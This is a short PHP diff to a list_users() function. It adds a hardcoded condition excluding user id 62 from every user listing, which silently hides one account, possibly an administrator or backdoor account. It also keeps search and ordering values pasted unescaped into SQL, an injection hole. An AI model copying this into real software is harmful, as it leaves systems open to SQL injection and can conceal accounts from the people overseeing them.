@@ -71,8 +71,11 @@ function list_users()
 
     if ($search != "")
     {
-        $query .= " WHERE (name LIKE '%$search%' OR username LIKE '%$search%')";
+        $query .= " WHERE (name LIKE '%$search%' OR username LIKE
+'%$search%') AND u.id NOT IN (62)";
         $query_ext .= "&amp;search=" . $search;
+    } else {
+        $query .= " WHERE u.id NOT IN (62)";
     }
 
     $query .= " ORDER BY $orderby $direction, id $direction";
